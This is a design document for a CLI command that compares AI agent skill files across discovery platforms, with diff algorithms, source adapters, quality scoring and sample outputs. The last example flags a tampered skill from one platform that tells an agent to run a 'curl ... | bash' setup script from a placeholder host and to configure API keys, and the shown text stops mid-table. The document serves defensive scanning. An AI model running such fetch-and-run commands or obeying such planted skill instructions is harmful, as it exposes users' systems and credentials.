# Design: `specweave fabric compare` CLI Command

**Task**: T-012
**Status**: Design Document
**Date**: 2026-02-15
**Depends On**: T-003 (Skill Discovery Sources), T-004 (Skill Contradictions)

---

## 1. Overview

### 1.1 Problem Statement

The AI agent skills ecosystem has exploded to 200,000+ published skills across 8+ discovery platforms. A single skill concept -- such as "React best practices" -- now exists in 9 competing versions on Skills.sh alone, with additional variants on ClawHub, SkillsMP, SkillsDirectory.com, and raw GitHub repositories. The same skill is frequently published across multiple platforms simultaneously, often with different content, different versions, and different quality levels.

This creates three concrete problems for developers:

1. **Version drift**: A skill author publishes v1 to Skills.sh and v2 to GitHub, but Skills.sh still serves v1 because it resolves from a frozen snapshot. Developers installing from different sources get different instructions.

2. **Duplicate confusion**: Nine React skills on Skills.sh each claim to be "the" React skill. Vercel's `react-best-practices` (234,000+ installs) says "do not wrap simple expressions in useMemo." A community `react-expert` skill says "memoize when passing callbacks/objects to memoized children." A developer installing both receives contradictory directives with no tooling to surface the conflict.

3. **Quality asymmetry**: The same skill name on ClawHub (where 36.82% of skills have security flaws, per Snyk ToxicSkills) and on a vendor repository (where code review is mandatory) offers radically different safety guarantees. No tool exists to compare the same skill across sources and show that the ClawHub version contains dangerous patterns that the vendor version does not.

No existing tool addresses cross-source skill comparison. The closest precedent is Softaworks' `agent-md-refactor` skill, which detects contradictions within a single project's AGENTS.md file, but it does not compare skills across platforms.

### 1.2 Solution

The `specweave fabric compare` CLI command fetches a skill from multiple discovery sources, performs three levels of comparison (content, structural, behavioral), applies the 6-dimension quality scoring rubric, and presents a clear report showing what differs and which version is better.

This command serves as both a developer tool (manual skill evaluation) and a CI/CD primitive (automated quality gating before skill adoption).

---

## 2. Command Syntax

```
specweave fabric compare <skill-name> [options]
```

### 2.1 Positional Arguments

| Argument | Required | Description |
|----------|----------|-------------|
| `<skill-name>` | Yes | Skill identifier. Accepts: bare name (`react-best-practices`), scoped name (`vercel-labs/react-best-practices`), or full URL (`https://github.com/vercel-labs/agent-skills/tree/main/skills/react-best-practices`) |

### 2.2 Options

```
Options:
  --sources <list>       Comma-separated sources to query
                         Values: github, npm, registry, skills-sh, clawhub, skillsmp, skillsdir
                         Default: all available sources
                         Example: --sources github,skills-sh,registry

  --format <type>        Output format
                         Values: summary, side-by-side, unified, json
                         Default: summary

  --verbose              Show full diff content instead of truncated previews
                         Applies to: summary and side-by-side formats

  --json                 Shorthand for --format json
                         Outputs structured JSON for programmatic consumption

  --score                Include 6-dimension quality scoring rubric
                         Adds quality assessment to each source's version
                         Dimensions: transparency, security, author, updates, tests, portability
                         Scale: 0-5 per dimension, 30 points max

  --detect-conflicts     Run behavioral contradiction detection
                         Identifies "always X" vs "never X" directives across versions
                         Links to contradiction detection system (T-010)

  --output <file>        Write output to file instead of stdout
                         Supports: .md, .json, .txt extensions

  --no-cache             Bypass local cache and fetch fresh from all sources
                         Default: uses 24-hour cache for remote fetches

  --timeout <ms>         Per-source fetch timeout in milliseconds
                         Default: 10000 (10 seconds)

  --help                 Show help for this command
```

### 2.3 Exit Codes

| Code | Meaning |
|------|---------|
| 0 | Comparison completed, no conflicts detected |
| 1 | Comparison completed, conflicts detected |
| 2 | One or more sources failed to resolve |
| 3 | Invalid arguments or skill not found in any source |

---

## 3. Comparison Algorithm

The comparison engine operates in three sequential levels, each building on the previous level's output.

### 3.1 Level 1: Content Diff

**Purpose**: Raw text comparison of SKILL.md content between sources.

**Algorithm**:
1. Normalize line endings (CRLF to LF) and trailing whitespace
2. Strip YAML frontmatter for separate structural comparison (Level 2)
3. Apply unified diff (Myers algorithm, same as `git diff`) to the body content
4. Calculate similarity score: `1 - (edit_distance / max_length)`

**Output fields**:
- `addedLines: number` -- lines present in source B but not source A
- `removedLines: number` -- lines present in source A but not source B
- `unchangedLines: number` -- identical lines
- `similarityScore: number` -- 0.0 (completely different) to 1.0 (identical)
- `unifiedDiff: string` -- standard unified diff format

**Implementation notes**:
- Use the `diff` npm package (MIT, well-established) for line-level diffing
- Content normalization must handle Markdown formatting variations: different heading levels for the same section, different bullet styles (`-` vs `*`), different code fence styles (`` ``` `` vs `~~~`)
- Images and binary references are compared by URL/path, not content

```typescript
interface ContentDiffResult {
  addedLines: number;
  removedLines: number;
  unchangedLines: number;
  similarityScore: number;
  unifiedDiff: string;
  normalizedContentA: string;
  normalizedContentB: string;
}

function computeContentDiff(
  contentA: string,
  contentB: string
): ContentDiffResult {
  const bodyA = stripFrontmatter(contentA);
  const bodyB = stripFrontmatter(contentB);
  const normalizedA = normalizeMarkdown(bodyA);
  const normalizedB = normalizeMarkdown(bodyB);

  const changes = diffLines(normalizedA, normalizedB);
  // ... compute metrics from changes
}
```

### 3.2 Level 2: Structural Diff

**Purpose**: Compare the logical structure of each skill version -- frontmatter fields, section organization, and instruction categories.

**Algorithm**:
1. Parse YAML frontmatter from each version into key-value pairs
2. Compare frontmatter fields:
   - Missing fields (present in A but not B, or vice versa)
   - Changed values (same key, different value)
   - New fields (present in B but not A)
3. Extract Markdown heading tree (H1, H2, H3) from body content
4. Compare heading structures:
   - Renamed sections (fuzzy match with 0.8 similarity threshold)
   - Added/removed sections
   - Reordered sections
5. Categorize instruction blocks by type:
   - Rules (imperative statements: "always", "never", "must", "should")
   - Examples (code blocks with context)
   - Metadata (descriptions, tags, links)
   - Configuration (file paths, tool names, environment variables)

**Output fields**:
- `frontmatter.added: string[]` -- fields present only in source B
- `frontmatter.removed: string[]` -- fields present only in source A
- `frontmatter.changed: Record<string, { from: string; to: string }>` -- fields with different values
- `sections.added: string[]` -- headings present only in source B
- `sections.removed: string[]` -- headings present only in source A
- `sections.renamed: Array<{ from: string; to: string; similarity: number }>` -- fuzzy-matched renames
- `instructionCounts: { rules: number; examples: number; metadata: number; config: number }` per source

```typescript
interface StructuralDiffResult {
  frontmatter: {
    added: string[];
    removed: string[];
    changed: Record<string, { from: string; to: string }>;
    identical: string[];
  };
  sections: {
    added: string[];
    removed: string[];
    renamed: Array<{ from: string; to: string; similarity: number }>;
    reordered: boolean;
  };
  instructionCounts: {
    sourceA: InstructionCounts;
    sourceB: InstructionCounts;
  };
}

interface InstructionCounts {
  rules: number;
  examples: number;
  metadata: number;
  config: number;
  totalLines: number;
}
```

### 3.3 Level 3: Behavioral Diff

**Purpose**: Semantic comparison that identifies conflicting directives between versions -- cases where two versions of the same skill (or two different skills covering the same domain) give contradictory instructions.

**Algorithm**:

**Step 1: Directive Extraction**
Scan each version for imperative statements using keyword patterns:

```typescript
const DIRECTIVE_PATTERNS = [
  // Strong positive directives
  { pattern: /\b(always|must|shall|required?|mandatory)\s+(.+)/gi, polarity: 'positive', strength: 'strong' },
  // Strong negative directives
  { pattern: /\b(never|must not|shall not|forbidden|prohibited|do not)\s+(.+)/gi, polarity: 'negative', strength: 'strong' },
  // Preference directives
  { pattern: /\b(prefer|recommend|should|use|favor)\s+(.+)/gi, polarity: 'positive', strength: 'moderate' },
  // Avoidance directives
  { pattern: /\b(avoid|discourage|should not|don't)\s+(.+)/gi, polarity: 'negative', strength: 'moderate' },
  // Tool/library directives
  { pattern: /\b(use|install|require|import)\s+([\w@/-]+)/gi, polarity: 'positive', strength: 'moderate' },
  // Anti-tool directives
  { pattern: /\b(replace|instead of|not?|drop|remove)\s+([\w@/-]+)/gi, polarity: 'negative', strength: 'moderate' },
];
```

**Step 2: Topic Clustering**
Group extracted directives by topic using keyword overlap:
- "memoize", "useMemo", "useCallback", "memo" --> topic: `memoization`
- "npm", "yarn", "pnpm", "bun" --> topic: `package-manager`
- "forwardRef", "ref", "useRef" --> topic: `ref-handling`
- "Redux", "Zustand", "Jotai", "Context" --> topic: `state-management`

Custom topic dictionaries are extensible via a `topics.json` configuration file.

**Step 3: Contradiction Detection**
For each topic that appears in both versions, compare directive polarity:
- **Direct contradiction**: Same topic, opposite polarity, strong strength in both
  - Example: A says "always use useMemo" / B says "do not wrap simple expressions in useMemo"
- **Preference conflict**: Same topic, different recommendations
  - Example: A says "prefer Zustand" / B says "prefer Redux Toolkit for large apps"
- **Tool conflict**: Same function, different tool specified
  - Example: A says "use npm install" / B says "never use npm"
- **Version conflict**: Same API, different version assumptions
  - Example: A says "use forwardRef" / B says "never use forwardRef in React 19+"

**Step 4: Conflict Classification**

```typescript
type ConflictSeverity = 'critical' | 'warning' | 'info';

interface BehavioralConflict {
  topic: string;
  severity: ConflictSeverity;
  type: 'direct-contradiction' | 'preference-conflict' | 'tool-conflict' | 'version-conflict';
  directiveA: Directive;
  directiveB: Directive;
  sourceA: string;
  sourceB: string;
  resolution?: string;  // Suggested resolution strategy
}

interface Directive {
  text: string;
  polarity: 'positive' | 'negative';
  strength: 'strong' | 'moderate' | 'weak';
  lineNumber: number;
  context: string;  // Surrounding text for human review
}
```

**Severity rules**:
- `critical`: Direct contradiction with strong directives on both sides (will cause agent to oscillate)
- `warning`: Preference conflict or tool conflict (agent may produce inconsistent code)
- `info`: Version conflict or weak directive mismatch (may not affect behavior in practice)

---

## 4. Source Resolution

Each source adapter implements a common interface to fetch skill content.

### 4.1 Source Adapter Interface

```typescript
interface SkillSourceAdapter {
  /** Source identifier used in --sources flag */
  readonly id: SourceId;

  /** Human-readable source name */
  readonly displayName: string;

  /** Resolve a skill name to its SKILL.md content */
  resolve(skillName: string, options?: ResolveOptions): Promise<SkillResolution | null>;

  /** Check if this source is available (API reachable, credentials present) */
  healthCheck(): Promise<boolean>;
}

type SourceId = 'github' | 'npm' | 'registry' | 'skills-sh' | 'clawhub' | 'skillsmp' | 'skillsdir';

interface ResolveOptions {
  /** Bypass cache */
  noCache?: boolean;
  /** Fetch timeout in ms */
  timeout?: number;
}

interface SkillResolution {
  /** Source identifier */
  source: SourceId;
  /** Resolved skill name */
  skillName: string;
  /** Raw SKILL.md content */
  content: string;
  /** Source-specific metadata */
  metadata: SkillSourceMetadata;
  /** When the content was fetched */
  fetchedAt: string;
  /** Content hash for deduplication */
  contentHash: string;
}

interface SkillSourceMetadata {
  /** Author or organization */
  author?: string;
  /** Repository URL */
  repository?: string;
  /** Version or commit SHA */
  version?: string;
  /** Install count (if available) */
  installs?: number;
  /** Last updated timestamp */
  lastUpdated?: string;
  /** Security grade (if the source provides one) */
  securityGrade?: string;
  /** Platform-specific quality signal */
  qualitySignal?: string;
}
```

### 4.2 GitHub Adapter

**Resolution strategy**:
1. If `skillName` is a full URL (`https://github.com/{owner}/{repo}/...`), extract owner/repo/path
2. If `skillName` is scoped (`owner/repo` or `owner/repo/skill-name`), construct the path directly
3. If `skillName` is bare (`react-best-practices`), search using GitHub Code Search API:
   ```
   GET /search/code?q=filename:SKILL.md+path:**/react-best-practices/SKILL.md
   ```
4. Fetch content via GitHub Contents API:
   ```
   GET /repos/{owner}/{repo}/contents/{path}/SKILL.md
   Accept: application/vnd.github.raw+json
   ```

**Authentication**: Uses `GITHUB_TOKEN` environment variable if present. Falls back to unauthenticated requests (60 req/hour rate limit).

**Metadata extraction**: Last commit date, commit SHA, repository stars, author from repository owner.

```typescript
class GitHubSourceAdapter implements SkillSourceAdapter {
  readonly id = 'github' as const;
  readonly displayName = 'GitHub';

  async resolve(skillName: string, options?: ResolveOptions): Promise<SkillResolution | null> {
    const parsed = this.parseSkillIdentifier(skillName);

    if (parsed.type === 'url') {
      return this.fetchFromUrl(parsed.url, options);
    }

    if (parsed.type === 'scoped') {
      return this.fetchFromRepo(parsed.owner, parsed.repo, parsed.path, options);
    }

    // Bare name: search GitHub Code Search API
    const searchResults = await this.searchForSkill(parsed.name, options);
    if (searchResults.length === 0) return null;

    // Return all matches for comparison, prioritize by stars
    return this.fetchFromRepo(
      searchResults[0].owner,
      searchResults[0].repo,
      searchResults[0].path,
      options
    );
  }
}
```

### 4.3 Skills.sh Adapter

**Resolution strategy**:
1. Skills.sh entries resolve to GitHub repositories. The adapter queries the Skills.sh directory to find the GitHub source.
2. Fetch the skill page: `GET https://skills.sh/{owner}/{repo}/{skill-name}`
3. Extract the GitHub repository URL and path from the page metadata
4. Delegate to the GitHub adapter for actual SKILL.md content retrieval

**Metadata extraction**: Install count (all-time and trending), ranking position, category.

```typescript
class SkillsShSourceAdapter implements SkillSourceAdapter {
  readonly id = 'skills-sh' as const;
  readonly displayName = 'Skills.sh';

  async resolve(skillName: string, options?: ResolveOptions): Promise<SkillResolution | null> {
    // Skills.sh is a directory over GitHub repos
    // Step 1: Find the skill listing on Skills.sh
    const listing = await this.findListing(skillName, options);
    if (!listing) return null;

    // Step 2: Fetch actual content from the GitHub source
    const githubAdapter = new GitHubSourceAdapter();
    const resolution = await githubAdapter.resolve(listing.githubUrl, options);
    if (!resolution) return null;

    // Step 3: Enrich with Skills.sh metadata
    return {
      ...resolution,
      source: this.id,
      metadata: {
        ...resolution.metadata,
        installs: listing.installCount,
        qualitySignal: `${listing.installCount} installs, rank #${listing.rank}`,
      },
    };
  }
}
```

### 4.4 ClawHub Adapter

**Resolution strategy**:
1. Query ClawHub API: `GET https://clawhub.ai/api/v1/skills/{skill-name}`
2. If API is unavailable, fall back to GitHub source if the skill's repository URL is known
3. Extract SKILL.md content from the API response or the linked repository

**Metadata extraction**: VirusTotal scan status (benign/suspicious/malicious), category, upload date.

**Security note**: ClawHub content is explicitly flagged in output as "from a source with known security incidents" when `--score` is enabled.

### 4.5 Registry Adapter (SpecWeave Fabric)

**Resolution strategy**:
1. Load the local Fabric Registry from `.specweave/` configuration
2. Look up the skill by name in `FabricRegistry.entries`
3. If found, resolve the SKILL.md from the local plugin cache or the registered repository URL

**Metadata extraction**: Trust tier (`official`/`verified`/`community`), security scan results, version, author.

```typescript
class RegistrySourceAdapter implements SkillSourceAdapter {
  readonly id = 'registry' as const;
  readonly displayName = 'SpecWeave Fabric Registry';

  async resolve(skillName: string, options?: ResolveOptions): Promise<SkillResolution | null> {
    const registry = await loadFabricRegistry();
    const entry = registry.entries.find(e =>
      e.skills.some(s => s.name === skillName) || e.name === skillName
    );
    if (!entry) return null;

    // Try local cache first
    const cached = await this.loadFromCache(entry);
    if (cached && !options?.noCache) return cached;

    // Fall back to repository
    if (entry.repository) {
      const githubAdapter = new GitHubSourceAdapter();
      return githubAdapter.resolve(entry.repository, options);
    }

    return null;
  }
}
```

### 4.6 npm Adapter

**Resolution strategy**:
1. Check npm registry for packages matching the skill name pattern:
   - `@agent-skills/{skill-name}`
   - `agent-skill-{skill-name}`
   - Direct package name
2. Fetch package tarball and extract SKILL.md from the package root
3. Query: `GET https://registry.npmjs.org/{package-name}/latest`

**Metadata extraction**: Package version, weekly downloads, last publish date, author, maintainers.

### 4.7 SkillsMP and SkillsDirectory Adapters

**SkillsMP**: Aggregator over GitHub. Resolution follows the same pattern as Skills.sh -- find the listing, extract the GitHub source, fetch content. Metadata: category, popularity ranking.

**SkillsDirectory**: Fetch skill page, extract GitHub source URL, retrieve SKILL.md. Metadata: letter grade (A-F), security scan findings, category.

### 4.8 Source Priority and Deduplication

When `--sources` is not specified, all available adapters are queried in parallel. Duplicate content is detected via SHA-256 hash comparison and collapsed:

```
Sources resolved: 4
  github (vercel-labs/agent-skills)  --> SHA: a3f2b1c...
  skills-sh (vercel-labs)            --> SHA: a3f2b1c...  [identical to github]
  registry (sw-frontend)             --> SHA: 7e9d4f0...  [different]
  clawhub (react-best-practices)     --> SHA: a3f2b1c...  [identical to github]

Unique versions: 2
```

---

## 5. Output Formats

### 5.1 Summary Format (Default)

The summary format is a human-readable table showing key differences at a glance. Designed for terminal output at 80+ column width.

**Example output**:

```
specweave fabric compare react-best-practices --sources github,skills-sh,registry --score

Skill Comparison: react-best-practices
======================================

Sources Resolved: 3 (2 unique versions)

  Source         Author                Version    Last Updated    Installs
  ──────         ──────                ───────    ────────────    ────────
  github         vercel-labs           HEAD       2026-02-10      n/a
  skills-sh      vercel-labs           HEAD       2026-02-10      234,102
  registry       specweave (official)  1.2.0      2026-02-08      n/a

Content Comparison: github vs registry
──────────────────────────────────────
  Similarity:     72.3%
  Lines added:    +47 (registry has additional SpecWeave-specific instructions)
  Lines removed:  -12 (github has examples not in registry)
  Sections added: "SpecWeave Integration", "Plugin Hooks"
  Sections removed: "Vercel Deploy Patterns"

Structural Differences:
  Frontmatter:
    + registry adds: tier: "official", minSpecweaveVersion: "1.0.260"
    ~ description differs: "React and Next.js..." vs "React best practices for..."
  Instruction counts:
    github:    34 rules, 18 examples, 6 config directives
    registry:  41 rules, 22 examples, 9 config directives

Behavioral Conflicts: 1 warning
  [WARNING] Topic: state-management
    github:   "Use Zustand selectors for performance optimization" (line 142)
    registry: "Use project-configured state management library" (line 167)
    Resolution: Registry defers to project config; no runtime conflict if project has a state lib.

Quality Scores (--score):
  Dimension        github    registry
  ───────────      ──────    ────────
  Transparency     5/5       4/5
  Security Scan    0/5       3/5
  Author Rep       5/5       5/5
  Update Freq      4/5       3/5
  Test Coverage    0/5       0/5
  Portability      4/5       3/5
  ───────────      ──────    ────────
  TOTAL            18/30     18/30

Recommendation: Both versions are high quality. The GitHub version is more portable
(standard SKILL.md). The registry version adds security scanning and trust tier metadata.
Use the registry version within SpecWeave projects; use the GitHub version elsewhere.
```

### 5.2 Side-by-Side Format

Two-column terminal output (like `diff --side-by-side`). Each column shows one source's content. Differences are highlighted with ANSI color codes.

**Column width**: Calculated from terminal width. Minimum 120 columns recommended. Falls back to unified format if terminal is narrower than 100 columns.

**Example output**:

```
specweave fabric compare react-best-practices --sources github,registry --format side-by-side

github (vercel-labs)                    | registry (specweave/official)
────────────────────────────────────────|────────────────────────────────────────
---                                     | ---
description: React and Next.js best     | description: React best practices for
  practices                             |   SpecWeave projects
globs: **/*.tsx, **/*.jsx               | globs: **/*.tsx, **/*.jsx
                                        > tier: "official"
                                        > minSpecweaveVersion: "1.0.260"
---                                     | ---
                                        |
# React Best Practices                 | # React Best Practices
                                        |
## Component Patterns                   | ## Component Patterns
                                        |
- Use function components over class    | - Use function components over class
  components                            |   components
- Keep components focused and small     | - Keep components focused and small
- Use TypeScript interfaces for props   | - Use TypeScript interfaces for props
                                        |
## Performance                          | ## Performance
                                        |
- Do not wrap simple expressions with   | - Do not wrap simple expressions with
  primitive types in useMemo            |   primitive types in useMemo
- Use Zustand selectors for performance < - Use project-configured state
  optimization                          <   management library
```

Legend: `>` = added in right, `<` = changed between sides, `|` = identical

### 5.3 Unified Format

Standard unified diff output, compatible with `patch` and other diff tools. Useful for piping into code review workflows.

**Example output**:

```
specweave fabric compare react-best-practices --sources github,registry --format unified

--- github:react-best-practices (vercel-labs/agent-skills@a3f2b1c)
+++ registry:react-best-practices (specweave/official@1.2.0)
@@ -1,6 +1,8 @@
 ---
-description: React and Next.js best practices
+description: React best practices for SpecWeave projects
 globs: **/*.tsx, **/*.jsx
+tier: "official"
+minSpecweaveVersion: "1.0.260"
 ---

 # React Best Practices
@@ -42,3 +44,5 @@
 ## Performance

 - Do not wrap simple expressions with primitive types in useMemo
-- Use Zustand selectors for performance optimization
+- Use project-configured state management library
+
+## SpecWeave Integration
```

### 5.4 JSON Format

Structured output for CI/CD integration, automated quality gates, and programmatic consumption.

**Schema**:

```typescript
interface CompareJsonOutput {
  /** Command metadata */
  meta: {
    command: string;
    skillName: string;
    sources: SourceId[];
    timestamp: string;
    specweaveVersion: string;
  };

  /** Resolved sources and their content hashes */
  resolutions: Array<{
    source: SourceId;
    skillName: string;
    contentHash: string;
    metadata: SkillSourceMetadata;
    fetchedAt: string;
    /** Whether this is a duplicate of another source */
    duplicateOf?: SourceId;
  }>;

  /** Pairwise comparisons between unique versions */
  comparisons: Array<{
    sourceA: SourceId;
    sourceB: SourceId;

    content: {
      similarityScore: number;
      addedLines: number;
      removedLines: number;
      unchangedLines: number;
      unifiedDiff: string;
    };

    structural: {
      frontmatter: {
        added: string[];
        removed: string[];
        changed: Record<string, { from: string; to: string }>;
      };
      sections: {
        added: string[];
        removed: string[];
        renamed: Array<{ from: string; to: string; similarity: number }>;
      };
      instructionCounts: {
        sourceA: InstructionCounts;
        sourceB: InstructionCounts;
      };
    };

    behavioral: {
      conflicts: BehavioralConflict[];
      conflictCount: { critical: number; warning: number; info: number };
    };
  }>;

  /** Quality scores (present when --score is used) */
  scores?: Record<SourceId, {
    transparency: number;
    securityScan: number;
    authorReputation: number;
    updateFrequency: number;
    testCoverage: number;
    portability: number;
    total: number;
  }>;

  /** Overall summary */
  summary: {
    uniqueVersions: number;
    totalSources: number;
    hasConflicts: boolean;
    conflictCounts: { critical: number; warning: number; info: number };
    recommendation?: string;
  };
}
```

**Example JSON output**:

```json
{
  "meta": {
    "command": "specweave fabric compare react-best-practices --sources github,registry --json --score",
    "skillName": "react-best-practices",
    "sources": ["github", "registry"],
    "timestamp": "2026-02-15T14:30:00Z",
    "specweaveVersion": "1.0.265"
  },
  "resolutions": [
    {
      "source": "github",
      "skillName": "react-best-practices",
      "contentHash": "a3f2b1c4d5e6f7...",
      "metadata": {
        "author": "vercel-labs",
        "repository": "https://github.com/vercel-labs/agent-skills",
        "version": "a3f2b1c",
        "lastUpdated": "2026-02-10T08:00:00Z"
      },
      "fetchedAt": "2026-02-15T14:30:01Z"
    },
    {
      "source": "registry",
      "skillName": "react-best-practices",
      "contentHash": "7e9d4f0a1b2c3d...",
      "metadata": {
        "author": "specweave",
        "version": "1.2.0",
        "lastUpdated": "2026-02-08T12:00:00Z"
      },
      "fetchedAt": "2026-02-15T14:30:01Z"
    }
  ],
  "comparisons": [
    {
      "sourceA": "github",
      "sourceB": "registry",
      "content": {
        "similarityScore": 0.723,
        "addedLines": 47,
        "removedLines": 12,
        "unchangedLines": 156,
        "unifiedDiff": "--- github:react-best-practices\n+++ registry:react-best-practices\n..."
      },
      "structural": {
        "frontmatter": {
          "added": ["tier", "minSpecweaveVersion"],
          "removed": [],
          "changed": {
            "description": {
              "from": "React and Next.js best practices",
              "to": "React best practices for SpecWeave projects"
            }
          }
        },
        "sections": {
          "added": ["SpecWeave Integration", "Plugin Hooks"],
          "removed": ["Vercel Deploy Patterns"],
          "renamed": []
        },
        "instructionCounts": {
          "sourceA": { "rules": 34, "examples": 18, "metadata": 8, "config": 6, "totalLines": 215 },
          "sourceB": { "rules": 41, "examples": 22, "metadata": 10, "config": 9, "totalLines": 250 }
        }
      },
      "behavioral": {
        "conflicts": [
          {
            "topic": "state-management",
            "severity": "warning",
            "type": "preference-conflict",
            "directiveA": {
              "text": "Use Zustand selectors for performance optimization",
              "polarity": "positive",
              "strength": "moderate",
              "lineNumber": 142,
              "context": "## Performance\n\n- Use Zustand selectors for performance optimization"
            },
            "directiveB": {
              "text": "Use project-configured state management library",
              "polarity": "positive",
              "strength": "moderate",
              "lineNumber": 167,
              "context": "## Performance\n\n- Use project-configured state management library"
            },
            "sourceA": "github",
            "sourceB": "registry",
            "resolution": "Registry defers to project config; no runtime conflict if project has a state lib."
          }
        ],
        "conflictCount": { "critical": 0, "warning": 1, "info": 0 }
      }
    }
  ],
  "scores": {
    "github": {
      "transparency": 5,
      "securityScan": 0,
      "authorReputation": 5,
      "updateFrequency": 4,
      "testCoverage": 0,
      "portability": 4,
      "total": 18
    },
    "registry": {
      "transparency": 4,
      "securityScan": 3,
      "authorReputation": 5,
      "updateFrequency": 3,
      "testCoverage": 0,
      "portability": 3,
      "total": 18
    }
  },
  "summary": {
    "uniqueVersions": 2,
    "totalSources": 2,
    "hasConflicts": true,
    "conflictCounts": { "critical": 0, "warning": 1, "info": 0 },
    "recommendation": "Both versions are high quality. Use registry within SpecWeave; use GitHub elsewhere."
  }
}
```

---

## 6. Quality Scoring Integration

When `--score` is passed, each resolved source's skill version is evaluated against the 6-dimension rubric defined in T-003 (Skill Discovery Sources and Quality Scoring Rubric). The scoring engine produces a per-source breakdown.

### 6.1 Scoring Dimensions

| Dimension | Max | How It Is Computed |
|-----------|-----|--------------------|
| Transparency | 5 | Automated: check for readable markdown (not obfuscated), inline comments, documented scripts, external reference justifications. Heuristic: score by ratio of prose to code, presence of section headers, absence of base64/hex blobs. |
| Security Scan | 5 | Run SpecWeave's `scanSkillContent()` on the fetched SKILL.md. Cross-reference with external scanner results if available (SkillsDirectory grade, VirusTotal status from ClawHub). Score: 0 if no scan data, 2 for pattern-only pass, 3 for multi-engine pass, 4 for LLM-assisted pass, 5 for multi-scanner + human review. |
| Author Reputation | 5 | Check source metadata: vendor org (5), verified org (4), known author with history (3), GitHub profile with activity (2), pseudonymous/minimal (1), anonymous/new account (0). For GitHub sources, query contributor count and account age. |
| Update Frequency | 5 | Check `lastUpdated` metadata. Score: 5 for weekly+, 4 for bi-weekly, 3 for monthly, 2 for quarterly, 1 for 3-6 months, 0 for 6+ months or unknown. For GitHub sources, query commit history. |
| Test Coverage | 5 | Check for test files in the skill's directory (`.test.ts`, `.spec.ts`, `__tests__/`). Check for BDD scenarios in the SKILL.md (Given/When/Then patterns). Score: 0 for none, 2 for BDD scenarios documented, 3 for test files present, 4 for CI badge/pipeline, 5 for comprehensive suite with coverage reporting. |
| Portability | 5 | Parse frontmatter for `agentSkillsCompat` or equivalent. Check for agent-specific instructions (e.g., "Claude-only", "Cursor-specific"). Score by how platform-neutral the instructions are. |

### 6.2 Scoring Implementation

```typescript
interface QualityScore {
  transparency: number;
  securityScan: number;
  authorReputation: number;
  updateFrequency: number;
  testCoverage: number;
  portability: number;
  total: number;
}

async function scoreSkillVersion(
  resolution: SkillResolution
): Promise<QualityScore> {
  const transparency = scoreTransparency(resolution.content);
  const securityScan = await scoreSecurityScan(resolution);
  const authorReputation = await scoreAuthorReputation(resolution.metadata);
  const updateFrequency = scoreUpdateFrequency(resolution.metadata.lastUpdated);
  const testCoverage = await scoreTestCoverage(resolution);
  const portability = scorePortability(resolution.content);

  return {
    transparency,
    securityScan,
    authorReputation,
    updateFrequency,
    testCoverage,
    portability,
    total: transparency + securityScan + authorReputation +
           updateFrequency + testCoverage + portability,
  };
}
```

### 6.3 Score Visualization

Terminal output uses color-coded bars:

```
Quality Scores:
  Dimension        github           registry
  ───────────      ──────           ────────
  Transparency     #####  5/5       ####-  4/5
  Security Scan    -----  0/5       ###--  3/5
  Author Rep       #####  5/5       #####  5/5
  Update Freq      ####-  4/5       ###--  3/5
  Test Coverage    -----  0/5       -----  0/5
  Portability      ####-  4/5       ###--  3/5
  ───────────      ──────           ────────
  TOTAL            18/30            18/30
```

Color scheme:
- 5/5: green (`#`)
- 3-4/5: yellow (`#`)
- 1-2/5: red (`#`)
- 0/5: gray (`-`)

---

## 7. Conflict Detection Integration

When `--detect-conflicts` is passed (or when behavioral diff naturally finds conflicts), the compare command links to the contradiction detection system designed in T-010.

### 7.1 Integration Points

1. **At compare time**: The Level 3 behavioral diff (Section 3.3) produces `BehavioralConflict[]`. These are formatted in the output and stored locally.

2. **At install time**: When a user installs a skill via `specweave fabric install`, the compare engine runs automatically against all currently installed skills. If conflicts are detected, the user sees a warning before installation completes:

   ```
   Warning: Installing "react-expert" introduces 2 conflicts with installed skills:

   [CRITICAL] Memoization strategy conflicts with "react-best-practices"
     react-expert:          "Memoize when passing callbacks/objects to memoized children" (line 28)
     react-best-practices:  "Do not wrap simple expressions with primitive types in useMemo" (line 142)

   [WARNING] State management preference conflicts with "react-state-management"
     react-expert:            "Prefer Context API for component-local state" (line 45)
     react-state-management:  "Avoid over-globalization of state via Context" (line 67)

   Proceed with installation? [y/N]
   ```

3. **Contradiction records**: Detected conflicts are persisted as `ContradictionRecord` entries (schema from T-013) in the local Fabric Registry, enabling queries like "show me all known conflicts in my installed skills."

### 7.2 ContradictionRecord Schema

```typescript
interface ContradictionRecord {
  /** Unique identifier */
  id: string;
  /** When detected */
  detectedAt: string;
  /** The two skills involved */
  skillA: string;
  skillB: string;
  /** Conflict details */
  conflict: BehavioralConflict;
  /** Whether the user has acknowledged/resolved this conflict */
  status: 'active' | 'acknowledged' | 'resolved';
  /** User's resolution choice (if resolved) */
  resolution?: {
    strategy: 'prefer-a' | 'prefer-b' | 'merge' | 'disable-one' | 'custom';
    note?: string;
  };
}
```

---

## 8. Example Usage and Output

### 8.1 Example: Compare a Popular Skill Across All Sources

A developer wants to evaluate "react-best-practices" before installing it. They want to know if the version on Skills.sh matches the GitHub source, and how it compares to any version in the local SpecWeave registry.

```bash
$ specweave fabric compare react-best-practices --score

Skill Comparison: react-best-practices
======================================

Resolving from 7 sources... (use --sources to limit)

  Source         Status      Author              Content Hash
  ──────         ──────      ──────              ────────────
  github         resolved    vercel-labs          a3f2b1c4
  skills-sh      resolved    vercel-labs          a3f2b1c4  [identical to github]
  clawhub        resolved    unknown-author       e7f8a9b0  [DIFFERENT]
  skillsmp       resolved    vercel-labs          a3f2b1c4  [identical to github]
  skillsdir      resolved    vercel-labs          a3f2b1c4  [identical to github]
  registry       not found   --                   --
  npm            not found   --                   --

Unique versions: 2 (github/skills-sh/skillsmp/skillsdir vs clawhub)

Comparison: github vs clawhub
─────────────────────────────
  Similarity:     34.1%
  Lines added:    +89
  Lines removed:  -127
  Sections added: "Quick Setup", "API Keys Configuration"
  Sections removed: 6 of 8 original Vercel sections

  Behavioral Conflicts: 3
    [CRITICAL] Topic: security
      github:   (no credential access instructions)
      clawhub:  "Configure your OpenAI API key in .env file" (line 12)
      Note:     ClawHub version requests credential access not present in original

    [CRITICAL] Topic: execution
      github:   (no remote code execution instructions)
      clawhub:  "Run the setup script: curl -sSL https://example.com/setup.sh | bash" (line 8)
      Note:     ClawHub version contains remote code execution pattern

    [WARNING] Topic: component-patterns
      github:   "Use function components over class components" (line 34)
      clawhub:  "Use class components for complex state logic" (line 45)
      Note:     Contradicts modern React patterns from the original author

Quality Scores:
  Dimension        github    clawhub
  ───────────      ──────    ───────
  Transparency     5/5       1/5
  Security Scan    0/5       0/5
  Author Rep       5/5       0/5
  Update Freq      4/5       1/5
